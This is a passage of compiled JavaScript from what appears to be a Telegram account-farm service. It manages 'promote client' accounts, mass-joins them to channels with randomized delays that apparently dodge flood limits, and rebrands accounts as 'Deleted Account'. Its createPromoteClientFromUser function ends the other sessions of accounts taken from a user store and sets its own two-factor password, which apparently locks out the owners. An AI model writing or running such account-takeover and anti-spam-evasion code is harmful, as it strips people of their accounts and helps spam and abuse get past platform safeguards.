            for (const [mobile, channels] of this.leaveChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    this.logger.debug(`Cleaning up empty leaveChannelMap entry for mobile: ${mobile}`);
                    this.leaveChannelMap.delete(mobile);
                }
            }
            this.trimMapIfNeeded(this.joinChannelMap, 'joinChannelMap');
            this.trimMapIfNeeded(this.leaveChannelMap, 'leaveChannelMap');
            this.logger.debug(`Memory cleanup completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}`);
        }
        catch (error) {
            this.logger.error('Error during memory cleanup:', error);
        }
    }
    trimMapIfNeeded(map, mapName) {
        if (map.size > this.MAX_MAP_SIZE) {
            const keysToRemove = Array.from(map.keys()).slice(this.MAX_MAP_SIZE);
            keysToRemove.forEach(key => map.delete(key));
            this.logger.warn(`Trimmed ${keysToRemove.length} entries from ${mapName}`);
        }
    }
    async create(promoteClient) {
        const promoteClientData = {
            ...promoteClient,
            status: promoteClient.status || 'active',
            message: promoteClient.message || 'Account is functioning properly',
        };
        const newUser = new this.promoteClientModel(promoteClientData);
        const result = await newUser.save();
        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `Promote Client Created:\n\nMobile: ${promoteClient.mobile}`);
        return result;
    }
    async findAll(statusFilter) {
        const filter = statusFilter ? { status: statusFilter } : {};
        return this.promoteClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.promoteClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `Promote Client:\n\nStatus Updated to ${status}\nMobile: ${mobile}\nReason: ${message || ''}`);
        return this.update(mobile, updateData);
    }
    async updateLastUsed(mobile) {
        return this.update(mobile, { lastUsed: new Date() });
    }
    async markAsUsed(mobile, message) {
        const updateData = { lastUsed: new Date() };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        this.logger.log(`Marking promote client ${mobile} as inactive: ${reason}`);
        try {
            return await this.updateStatus(mobile, 'inactive', reason);
        }
        catch (error) {
            this.logger.error(`Failed to mark promote client ${mobile} as inactive: ${error.message}`);
        }
    }
    async markAsActive(mobile, message = 'Account is functioning properly') {
        return this.updateStatus(mobile, 'active', message);
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            this.logger.debug(`Updating existing promote client: ${mobile}`);
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            this.logger.debug(`Creating new promote client: ${mobile}`);
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile, message) {
        try {
            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);
            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();
            if (deleteResult.deletedCount === 0) {
                throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.serviceName || process.env.clientId} Deleting Promote Client : ${mobile}\n${message}`)}`);
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException) {
                throw error;
            }
            const errorDetails = (0, parseError_1.parseError)(error);
            this.logger.error(`[${mobile}] Error removing PromoteClient: ${errorDetails.message}`, errorDetails);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`[${mobile}] PromoteClient removed successfully`);
    }
    async search(filter) {
        this.logger.debug(`Modified filter:`, filter);
        return this.promoteClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        if (!query) {
            throw new common_1.BadRequestException('Query is invalid.');
        }
        try {
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
            throw new common_1.InternalServerErrorException(`Query execution failed: ${errorMessage}`);
        }
    }
    removeFromPromoteMap(key) {
        const deleted = this.joinChannelMap.delete(key);
        if (deleted) {
            this.logger.debug(`Removed ${key} from join channel map`);
        }
    }
    clearPromoteMap() {
        this.logger.debug('PromoteMap cleared');
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async updateInfo() {
        const clients = await this.promoteClientModel
            .find({ status: 'active', lastChecked: { $lt: new Date(Date.now() - 7 * this.ONE_DAY_MS) } })
            .sort({ channels: 1 })
            .limit(25);
        const now = Date.now();
        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            const mobile = client?.mobile;
            this.logger.info(`Processing PromoteClient (${i + 1}/${clients.length}): ${mobile}`);
            const lastChecked = client.lastChecked
                ? new Date(client.lastChecked).getTime()
                : 0;
            await this.performHealthCheck(mobile, lastChecked, now);
            if (i < clients.length - 1) {
                await (0, Helpers_1.sleep)(12000 + Math.random() * 8000);
            }
        }
    }
    async joinchannelForPromoteClients(skipExisting = true) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Active client setup exists, skipping promotion process');
            return 'Active client setup exists, skipping promotion';
        }
        this.logger.log('Starting join channel process');
        this.clearAllMapsAndIntervals();
        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
        try {
            const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.promoteClientModel
                .find({
                channels: { $lt: 350 },
                mobile: { $nin: existingKeys },
                status: 'active',
            })
                .sort({ channels: 1 })
                .limit(16);
            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);
            const joinSet = new Set();
            const leaveSet = new Set();
            let successCount = 0;
            let failCount = 0;
            for (const document of clients) {
                const mobile = document.mobile;
                this.logger.debug(`Processing client: ${mobile}`);
                try {
                    const client = await connection_manager_1.connectionManager.getClient(mobile, {
                        autoDisconnect: false,
                        handler: false,
                    });
                    await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                    const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                    this.logger.debug(`[${mobile}]: Found ${channels.ids.length} existing channels`);
                    await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                    await this.update(mobile, { channels: channels.ids.length });
                    if (channels.ids.length > 100) {
                        await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                        const profilePics = await (0, getProfilePics_1.getProfilePics)(client.client);
                        if (profilePics.length > 0) {
                            await (0, deleteProfilePics_1.deleteProfilePhotos)(client.client, profilePics);
                            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                        }
                    }
                    if (channels.canSendFalseCount < 10) {
                        const excludedIds = channels.ids;
                        const channelLimit = 150;
                        await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                        const isBelowThreshold = channels.ids.length < 220;
                        const result = isBelowThreshold
                            ? await this.activeChannelsService.getActiveChannels(channelLimit, 0, excludedIds)
                            : await this.channelsService.getActiveChannels(channelLimit, 0, excludedIds);
                        if (!this.joinChannelMap.has(mobile)) {
                            this.joinChannelMap.set(mobile, result);
                            this.trimMapIfNeeded(this.joinChannelMap, 'joinChannelMap');
                            joinSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`[${mobile}]: Already in join queue, skipping re-add`);
                        }
                        await this.sessionService.getOldestSessionOrCreate({ mobile: document.mobile });
                    }
                    else {
                        this.logger.debug(`[${mobile}]: Too many blocked channels (${channels.canSendFalseCount}), preparing for leave`);
                        if (!this.leaveChannelMap.has(mobile)) {
                            this.leaveChannelMap.set(mobile, channels.canSendFalseChats);
                            this.trimMapIfNeeded(this.leaveChannelMap, 'leaveChannelMap');
                            leaveSet.add(mobile);
                        }
                        else {
                            this.logger.debug(`[${mobile}]: Already in leave queue, skipping re-add`);
                        }
                    }
                    successCount++;
                }
                catch (error) {
                    failCount++;
                    const errorDetails = (0, parseError_1.parseError)(error);
                    this.logger.error(`[${mobile}] Error processing client:`, errorDetails);
                    if ((0, isPermanentError_1.default)(errorDetails)) {
                        await (0, Helpers_1.sleep)(1000);
                        await this.markAsInactive(mobile, `${errorDetails.message}`);
                    }
                    else {
                        this.logger.warn(`[${mobile}]: Non-fatal error encountered, will retry later`);
                    }
                }
                finally {
                    await this.safeUnregisterClient(mobile);
                    await (0, Helpers_1.sleep)(8000 + Math.random() * 5000);
                }
            }
            await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
            if (joinSet.size > 0) {
                this.startMemoryCleanup();
                this.logger.debug(`Starting join queue for ${joinSet.size} clients`);
                this.createTimeout(() => this.joinChannelQueue(), 2000);
            }
            if (leaveSet.size > 0) {
                this.logger.debug(`Starting leave queue for ${leaveSet.size} clients`);
                this.createTimeout(() => this.leaveChannelQueue(), 5000);
            }
            this.logger.log(`Join channel process completed for ${clients.length} clients (Success: ${successCount}, Failed: ${failCount})`);
            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;
        }
        catch (error) {
            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);
            this.clearAllMapsAndIntervals();
            throw new Error('Failed to initiate channel joining process');
        }
    }
    clearAllMapsAndIntervals() {
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
    }
    async joinChannelQueue() {
        if (this.isJoinChannelProcessing) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        if (this.joinChannelMap.size === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        if (!this.joinChannelIntervalId) {
            this.logger.debug('Starting join channel interval');
            this.joinChannelIntervalId = setInterval(async () => {
                await this.processJoinChannelInterval();
            }, this.JOIN_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.joinChannelIntervalId);
            await this.processJoinChannelInterval();
        }
        else {
            this.logger.warn('Join channel interval is already running');
        }
    }
    async processJoinChannelInterval() {
        if (this.isJoinChannelProcessing) {
            this.logger.debug('Join channel process already running, skipping interval');
            return;
        }
        if (this.joinChannelMap.size === 0) {
            this.logger.debug('No channels to join, clearing interval');
            this.clearJoinChannelInterval();
            return;
        }
        this.isJoinChannelProcessing = true;
        try {
            await this.processJoinChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in join channel queue', error);
        }
        finally {
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size === 0) {
                this.clearJoinChannelInterval();
            }
        }
    }
    async processJoinChannelSequentially() {
        const keys = Array.from(this.joinChannelMap.keys());
        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            let currentChannel = null;
            try {
                const channels = this.joinChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                    this.removeFromPromoteMap(mobile);
                    continue;
                }
                currentChannel = channels.shift();
                if (!currentChannel) {
                    this.logger.debug(`No channel to process for ${mobile}, removing from queue`);
                    this.removeFromPromoteMap(mobile);
                    continue;
                }
                this.logger.debug(`[${mobile}] Processing channel: @${currentChannel.username} (${channels.length} remaining)`);
                this.joinChannelMap.set(mobile, channels);
                let activeChannel = null;
                try {
                    activeChannel = await this.activeChannelsService.findOne(currentChannel.channelId);
                }
                catch (findError) {
                    this.logger.warn(`Error fetching active channel ${currentChannel.channelId}:`, findError);
                }
                if (!activeChannel || activeChannel.banned || (activeChannel.deletedCount && activeChannel.deletedCount > 0)) {
                    this.logger.debug(`Skipping invalid/banned/deleted channel ${currentChannel.channelId}`);
                    await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                    continue;
                }
                await this.telegramService.tryJoiningChannel(mobile, currentChannel);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `[${mobile}] ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error: `, false);
                if (errorDetails.error === 'FloodWaitError' ||
                    error.errorMessage === 'CHANNELS_TOO_MUCH') {
                    this.logger.warn(`[${mobile}] FloodWaitError or too many channels, removing from queue`);
                    this.removeFromPromoteMap(mobile);
                    await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                    if (error.errorMessage === 'CHANNELS_TOO_MUCH') {
                        await this.update(mobile, { channels: 400 });
                    }
                    else {
                        const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                        await this.update(mobile, { channels: channelsInfo.ids.length });
                    }
                }
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    this.removeFromPromoteMap(mobile);
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                }
            }
            finally {
                await this.safeUnregisterClient(mobile);
                if (i < keys.length - 1 ||
                    this.joinChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY);
                }
            }
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval`);
            clearInterval(this.joinChannelIntervalId);
            this.activeTimeouts.delete(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
        this.isJoinChannelProcessing = false;
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        const mapSize = this.leaveChannelMap.size;
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        if (this.leaveChannelMap.size === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        if (!this.leaveChannelIntervalId) {
            this.logger.debug('Starting leave channel interval');
            this.leaveChannelIntervalId = setInterval(async () => {
                await this.processLeaveChannelInterval();
            }, this.LEAVE_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.leaveChannelIntervalId);
            await this.processLeaveChannelInterval();
        }
        else {
            this.logger.warn('Leave channel interval is already running');
        }
    }
    async processLeaveChannelInterval() {
        if (this.isLeaveChannelProcessing) {
            this.logger.debug('Leave channel process already running, skipping interval');
            return;
        }
        if (this.leaveChannelMap.size === 0) {
            this.logger.debug('No channels to leave, clearing interval');
            this.clearLeaveChannelInterval();
            return;
        }
        this.isLeaveChannelProcessing = true;
        try {
            await this.processLeaveChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in leave channel queue', error);
        }
        finally {
            this.isLeaveChannelProcessing = false;
            if (this.leaveChannelMap.size === 0) {
                this.clearLeaveChannelInterval();
            }
        }
    }
    async processLeaveChannelSequentially() {
        const keys = Array.from(this.leaveChannelMap.keys());
        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            try {
                const channels = this.leaveChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                    this.removeFromLeaveMap(mobile);
                    continue;
                }
                const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                this.logger.debug(`[${mobile}] Processing ${channelsToProcess.length} channels to leave (${channels.length} remaining)`);
                if (channels.length > 0) {
                    this.leaveChannelMap.set(mobile, channels);
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                await client.leaveChannels(channelsToProcess);
                this.logger.debug(`[${mobile}] Successfully left ${channelsToProcess.length} channels`);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `[${mobile}] Leave Channel ERR: `, false);
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                    this.removeFromLeaveMap(mobile);
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);
                }
            }
            finally {
                await this.safeUnregisterClient(mobile);
                if (i < keys.length - 1 ||
                    this.leaveChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)((this.LEAVE_CHANNEL_INTERVAL / 2) + Math.random() * 30000);
                }
            }
        }
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval`);
            clearInterval(this.leaveChannelIntervalId);
            this.activeTimeouts.delete(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
    }
    async safeUnregisterClient(mobile) {
        try {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
        catch (unregisterError) {
            const errorMessage = unregisterError instanceof Error ? unregisterError.message : 'Unknown error';
            this.logger.error(`Error unregistering client ${mobile}: ${errorMessage}`);
        }
    }
    async setAsPromoteClient(mobile, availableDate = client_helper_utils_1.ClientHelperUtils.getTodayDateString()) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('User not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('PromoteClient already exists');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        if (clientMobiles.includes(mobile)) {
            throw new common_1.BadRequestException('Number is an Active Client');
        }
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
        try {
            await telegramClient.set2fa();
            await (0, Helpers_1.sleep)(30000 + Math.random() * 30000);
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            await telegramClient.updateUsername('');
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
            await telegramClient.updatePrivacyforDeletedAccount();
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
            await telegramClient.updateProfile('Deleted Account', 'Deleted Account');
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
            await telegramClient.deleteProfilePhotos();
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
            const channels = await this.telegramService.getChannelInfo(mobile, true);
            const promoteClient = {
                tgId: user.tgId,
                lastActive: 'default',
                mobile: user.mobile,
                availableDate,
                channels: channels.ids.length,
                status: 'active',
                message: 'Manually configured as promote client',
                lastUsed: null,
            };
            await this.promoteClientModel
                .findOneAndUpdate({ mobile: user.mobile }, { $set: promoteClient }, { new: true, upsert: true })
                .exec();
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        finally {
            await this.safeUnregisterClient(mobile);
        }
        return 'Client set as promote successfully';
    }
    async updateUser2FAStatus(tgId, mobile) {
        try {
            await this.usersService.update(tgId, { twoFA: true });
        }
        catch (userUpdateError) {
            this.logger.warn(`Failed to update user 2FA status for ${mobile}:`, userUpdateError);
        }
    }
    handleError(error, context, mobile) {
        const contextWithMobile = mobile ? `${context}: ${mobile}` : context;
        return (0, parseError_1.parseError)(error, contextWithMobile, false);
    }
    async calculateAvailabilityBasedNeeds(clientId) {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayStr = today.toISOString().split('T')[0];
        const windows = this.AVAILABILITY_WINDOWS.map(window => ({
            ...window,
            targetDate: new Date(today.getTime() + window.days * this.ONE_DAY_MS)
                .toISOString().split('T')[0]
        }));
        const totalActive = await this.promoteClientModel.countDocuments({
            clientId,
            status: 'active'
        });
        const windowNeeds = [];
        let maxNeeded = 0;
        let mostUrgentWindow = '';
        let mostUrgentPriority = 999;
        for (const window of windows) {
            const availableCount = await this.promoteClientModel.countDocuments({
                clientId,
                status: 'active',
                availableDate: { $lte: window.targetDate }
            });
            const needed = Math.max(0, window.minRequired - availableCount);
            windowNeeds.push({
                window: window.name,
                available: availableCount,
                needed,
                targetDate: window.targetDate,
                minRequired: window.minRequired
            });
            if (needed > maxNeeded) {
                maxNeeded = needed;
                mostUrgentWindow = window.name;
                mostUrgentPriority = window.days;
            }
            else if (needed > 0 && window.days < mostUrgentPriority) {
                mostUrgentWindow = window.name;
                mostUrgentPriority = window.days;
            }
        }
        const totalNeededForCount = Math.max(0, this.MIN_TOTAL_PROMOTE_CLIENTS - totalActive);
        const totalNeeded = Math.max(maxNeeded, totalNeededForCount);
        let priority = 100;
        if (maxNeeded > 0) {
            priority = mostUrgentPriority;
        }
        let calculationReason = '';
        if (maxNeeded > 0 && totalNeededForCount > 0) {
            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded}, total count needs ${totalNeededForCount}`;
        }
        else if (maxNeeded > 0) {
            const windowConfig = this.AVAILABILITY_WINDOWS.find(w => w.name === mostUrgentWindow);
            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded} to meet minimum of ${windowConfig?.minRequired || 'unknown'}`;
        }
        else if (totalNeededForCount > 0) {
            calculationReason = `Total count needs ${totalNeededForCount} to reach minimum of ${this.MIN_TOTAL_PROMOTE_CLIENTS}`;
        }
        else {
            calculationReason = 'All windows satisfied';
        }
        return {
            totalNeeded,
            windowNeeds,
            totalActive,
            totalNeededForCount,
            calculationReason,
            priority
        };
    }
    async createPromoteClientFromUser(document, targetClientId, availableDate) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(document.mobile, {
            autoDisconnect: false,
        });
        try {
            const hasPassword = await telegramClient.hasPassword();
            this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
            if (hasPassword) {
                this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);
                await this.updateUser2FAStatus(document.tgId, document.mobile);
                return false;
            }
            await telegramClient.removeOtherAuths();
            await (0, Helpers_1.sleep)(10000 + Math.random() * 10000);
            await telegramClient.set2fa();
            this.logger.debug('Waiting for setting 2FA');
            await (0, Helpers_1.sleep)(30000 + Math.random() * 30000);
            const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const targetAvailableDate = availableDate || client_helper_utils_1.ClientHelperUtils.getTodayDateString();
            this.logger.debug(`Inserting Document for client ${targetClientId} with availableDate ${targetAvailableDate}`);
            const promoteClient = {
                tgId: document.tgId,
                lastActive: 'today',
                mobile: document.mobile,
                availableDate: targetAvailableDate,
                channels: channels.ids.length,
                clientId: targetClientId,
                status: 'active',
                message: 'Account successfully configured as promote client',
                lastUsed: null,
            };
            await this.create(promoteClient);
            await this.updateUser2FAStatus(document.tgId, document.mobile);
            this.logger.log(`Created PromoteClient for ${targetClientId} with availability ${targetAvailableDate}`);
            return true;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
            this.logger.error(`Error processing promote client ${document.mobile}: ${errorDetails.message}`);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                try {
                    await this.markAsInactive(document.mobile, errorDetails.message);
                }
                catch (markError) {
                    this.logger.error(`Failed to mark ${document.mobile} as inactive:`, markError);
                }
            }
            return false;
        }
        finally {
            await this.safeUnregisterClient(document.mobile);
            await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
        }
    }
    async backfillTimestamps(mobile, doc, now) {
        const needsBackfill = !doc.privacyUpdatedAt || !doc.profilePicsDeletedAt ||
            !doc.nameBioUpdatedAt || !doc.usernameUpdatedAt ||
            !doc.profilePicsUpdatedAt;
        if (!needsBackfill)
            return;
        this.logger.log(`Backfilling timestamp fields for ${mobile}`);
        const allTimestamps = client_helper_utils_1.ClientHelperUtils.createBackfillTimestamps(now, this.ONE_DAY_MS);
        const backfillData = {};
        if (!doc.privacyUpdatedAt)
            backfillData.privacyUpdatedAt = allTimestamps.privacyUpdatedAt;
        if (!doc.profilePicsDeletedAt)
            backfillData.profilePicsDeletedAt = allTimestamps.profilePicsDeletedAt;
        if (!doc.nameBioUpdatedAt)
            backfillData.nameBioUpdatedAt = allTimestamps.nameBioUpdatedAt;
        if (!doc.usernameUpdatedAt)
            backfillData.usernameUpdatedAt = allTimestamps.usernameUpdatedAt;
        if (!doc.profilePicsUpdatedAt)
            backfillData.profilePicsUpdatedAt = allTimestamps.profilePicsUpdatedAt;
        await this.update(mobile, backfillData);
        this.logger.log(`Backfilled ${Object.keys(backfillData).length} timestamp fields for ${mobile}`);
    }
    async performHealthCheck(mobile, lastChecked, now) {
        const needsHealthCheck = !lastChecked || (now - lastChecked > 7 * this.ONE_DAY_MS);
        if (!needsHealthCheck) {
            return true;
        }
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                autoDisconnect: false,
                handler: false,
            });
            await telegramClient.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [new telegram_1.Api.InputPrivacyValueDisallowAll()],
            }));
            const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, true);
            await this.update(mobile, {
                channels: channels.ids.length,
                lastChecked: new Date()
            });
            this.logger.debug(`Health check passed for ${mobile}`);
            return true;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Health check failed', mobile);
            this.logger.warn(`Health check failed for ${mobile}: ${errorDetails.message}`);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.markAsInactive(mobile, `Health check failed: ${errorDetails.message}`);
            }
            return false;
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    getPendingUpdates(doc, now) {
        const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;
        const DAY = this.ONE_DAY_MS;
        const MIN_DAYS_BETWEEN_UPDATES = DAY;
        const reasons = [];
        const privacyTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.privacyUpdatedAt);
        const needsPrivacy = accountAge >= DAY && accountAge <= 30 * DAY &&
            (privacyTimestamp === 0 || privacyTimestamp < now - 15 * DAY);
        if (needsPrivacy)
            reasons.push('Privacy update needed');
        const privacyDone = privacyTimestamp > 0 && (now - privacyTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const photosDeletedTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt);
        const needsDeletePhotos = accountAge >= 2 * DAY && accountAge <= 30 * DAY &&
            (photosDeletedTimestamp === 0 || photosDeletedTimestamp < now - 30 * DAY) &&
            (privacyDone || privacyTimestamp === 0);
        if (needsDeletePhotos)
            reasons.push('Delete photos needed');
        const photosDone = photosDeletedTimestamp > 0 && (now - photosDeletedTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const nameBioTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt);
        const needsNameBio = accountAge >= 3 * DAY && accountAge <= 30 * DAY &&
            (doc.channels || 0) > 100 &&
            (nameBioTimestamp === 0 || nameBioTimestamp < now - 30 * DAY) &&
            (photosDone || photosDeletedTimestamp === 0);
        if (needsNameBio)
            reasons.push('Name/Bio update needed');
        const nameBioDone = nameBioTimestamp > 0 && (now - nameBioTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const usernameTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt);
        const needsUsername = accountAge >= 7 * DAY && accountAge <= 30 * DAY &&
            (doc.channels || 0) > 150 &&
            (usernameTimestamp === 0 || usernameTimestamp < now - 30 * DAY) &&
            (nameBioDone || nameBioTimestamp === 0);
        if (needsUsername)
            reasons.push('Username update needed');
        const usernameDone = usernameTimestamp > 0 && (now - usernameTimestamp >= MIN_DAYS_BETWEEN_UPDATES);
        const profilePicsTimestamp = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.profilePicsUpdatedAt);
        const needsProfilePhotos = accountAge >= 10 * DAY && accountAge <= 30 * DAY &&
            (doc.channels || 0) > 170 &&
            (profilePicsTimestamp === 0 || profilePicsTimestamp < now - 30 * DAY) &&
            (usernameDone || usernameTimestamp === 0);
        if (needsProfilePhotos)
            reasons.push('Profile photos update needed');
        const totalPending = [needsPrivacy, needsDeletePhotos, needsNameBio, needsUsername, needsProfilePhotos]
            .filter(Boolean).length;
        return {
            needsPrivacy,
            needsDeletePhotos,
            needsNameBio,
            needsUsername,
            needsProfilePhotos,
            totalPending,
            reasons
        };
    }
    async updatePrivacySettings(doc, client, failedAttempts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
        try {
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            await telegramClient.updatePrivacyforDeletedAccount();
            await this.update(doc.mobile, {
                privacyUpdatedAt: new Date(),
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: 0,
                lastUpdateFailure: null
            });
            this.logger.debug(`Updated privacy settings for ${doc.mobile}`);
            await (0, Helpers_1.sleep)(30000 + Math.random() * 20000);
            return 1;
        }
        catch (error) {
            const errorDetails = this.handleError(error, 'Error updating privacy', doc.mobile);
            await this.update(doc.mobile, {
                lastUpdateAttempt: new Date(),
                failedUpdateAttempts: failedAttempts + 1,
                lastUpdateFailure: new Date()
            });
            if ((0, isPermanentError_1.default)(errorDetails)) {
